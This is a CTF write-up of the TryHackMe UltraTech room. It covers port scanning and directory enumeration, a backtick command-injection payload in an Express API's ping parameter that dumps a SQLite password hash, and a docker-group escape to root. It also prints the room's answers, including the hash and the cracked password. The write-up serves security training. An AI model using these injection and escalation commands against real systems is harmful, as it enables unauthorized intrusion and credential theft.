---
title: "UltraTech CTF - TryHackMe"
category: "THM"
pubDate: 2020-06-14
description: "Writeup for the UltraTech CTF room on TryHackMe"
---
[TryHackMe | UltraTech CTF](https://tryhackme.com/room/ultratech1)

This room is inspired from real-life vulnerabilities and misconfigurations I encountered during security assessments.

If you get stuck at some point, take some time to keep enumerating.

**[ Your Mission ]**

You have been contracted by UltraTech to pentest their infrastructure.

It is a grey-box kind of assessment, the only information you have

is the company's name and their server's IP address.

**Start this room by hitting the "deploy" button on the right!**

Good luck and more importantly, have fun!

# Part 1

After enumerating the services and resources available on this machine, what did you discover?

---

### Setup ✅

```
➜  TryHackMe nmap -A -vv 10.10.124.2
```

```
21/tcp   open  ftp     syn-ack vsftpd 3.0.3

22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDiFl7iswZsMnnI2RuX0ezMMVjUXFY1lJmZr3+H701ZA6nJUb2ymZyXusE/wuqL4BZ+x5gF2DLLRH7fdJkdebuuaMpQtQfEdsOMT+JakQgCDls38FH1jcrpGI3MY55eHcSilT/EsErmuvYv1s3Yvqds6xoxyvGgdptdqiaj4KFBNSDVneCSF/K7IQdbavM3Q7SgKchHJUHt6XO3gICmZmq8tSAdd2b2Ik/rYzpIiyMtfP3iWsyVgjR/q8oR08C2lFpPN8uSyIHkeH1py0aGl+V1E7j2yvVMIb4m3jGtLWH89iePTXmfLkin2feT6qAm7acdktZRJTjaJ8lEMFTHEijJ
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLy2NkFfAZMY462Bf2wSIGzla3CDXwLNlGEpaCs1Uj55Psxk5Go/Y6Cw52NEljhi9fiXOOkIxpBEC8bOvEcNeNY=
|   256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEipoohPz5HURhNfvE+WYz4Hc26k5ObMPnAQNoUDsge3

8081/tcp open  http    syn-ack Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesnt have a title (text/html; charset=utf-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### #1 Which software is using the port 8081?

```
8081/tcp open  http    syn-ack Node.js Express framework
```

```
node.js
```

### #2 Which other non-standard port is used?

Since on our first nmap scan we didn't find the port let's scan all the ports

```
➜  ~ TryHackMe nmap -A -vv -p- 10.10.124.2
```

```
31331/tcp open
```

### #3 Which software using this port?

```
apache
```

### #4 Which GNU/Linux distribution seems to be used?

```
ubuntu
```

### #5 The software using the port 8080 is a REST api, how many of its routes are used by the web application?

![](https://imgur.com/HJrW4R2.png)

```
➜  TryHackMe gobuster dir -u http://10.10.124.2:8081/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.124.2:8081/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/13 17:44:16 Starting gobuster
===============================================================
/auth (Status: 200)
```

![](https://imgur.com/8hEyF02.png)

# Part 3

---

Now that you know which services are available, it's time to exploit them !

Did you find somewhere you could try to login ? Great !

Quick and dirty login implementations usually goes with poor data management.

There must be something you can do to explore this machine more thoroughly..

### #1 There is a database lying around, what is its filename?

![](https://imgur.com/tuO0kgU.png)

```
➜  TryHackMe dirb http://10.10.124.2:31331/
```

```
➜  TryHackMe dirb http://10.10.124.2:31331/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat Jun 13 18:30:24 2020
URL_BASE: http://10.10.124.2:31331/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.124.2:31331/ ----
==> DIRECTORY: http://10.10.124.2:31331/css/
+ http://10.10.124.2:31331/favicon.ico (CODE:200|SIZE:15086)
==> DIRECTORY: http://10.10.124.2:31331/images/
+ http://10.10.124.2:31331/index.html (CODE:200|SIZE:6092)
==> DIRECTORY: http://10.10.124.2:31331/javascript/
==> DIRECTORY: http://10.10.124.2:31331/js/
+ http://10.10.124.2:31331/robots.txt (CODE:200|SIZE:53)
+ http://10.10.124.2:31331/server-status (CODE:403|SIZE:302)
```

![](https://imgur.com/JwcnH47.png)

```
Sitemap: /utech_sitemap.txt
```

![](https://imgur.com/0QGLxrF.png)

![](https://imgur.com/4oxDK1P.png)

As you can see there is some script on the bottom of the page

![](https://imgur.com/bHSVNrk.png)

```
function getAPIURL() {
return `${window.location.hostname}:8081`
function checkAPIStatus() {
const req = new XMLHttpRequest();
const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
```

Let's try if we can ping something with the api

![](https://imgur.com/k6dMvGz.png)

![](https://imgur.com/NiZaChE.png)

```
utech.db.sqlite
```

### #2 What is the first user's password hash?

After some tries, something cool happened, if we cat the database name we can see the user's password hash

```
http://10.10.124.2:8081/ping?ip=`cat%20utech.db.sqlite`
```

![](https://imgur.com/BFY62ek.png)

```
r00tf357a0c52799563c7c7b76c1e7543a32
```

### #3 What is the password associated with this hash?

Let's see if in the crack station database we can have the user's password

![](https://imgur.com/ULh9XYu.png)

Yep ! That worked 🤤

```
password : n100906
```

# Part 4

---

Congrats if you've made it this far, you should be able to comfortably run commands on the server by now!

Now's the time for the final step!

You'll be on your own for this one, there is only one question and there might be more than a single way to reach your goal.

Mistakes were made, take advantage of it.

---

### #1 What are the first 9 characters of the root user's private SSH key?

We can try the api "/auth" 😵

![](https://imgur.com/hQLygDy.png)

```
http://10.10.124.2:8081/auth?login=r00t&password=n100906
```

![](https://imgur.com/k8UD4e5.png)

As you can see the is the group docker let's try something

[docker | GTFOBins](https://gtfobins.github.io/gtfobins/docker/)

```
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

![](https://imgur.com/dlyIsfn.png)

![](https://imgur.com/WZFA2m7.png)

```
MIIEogIBA
```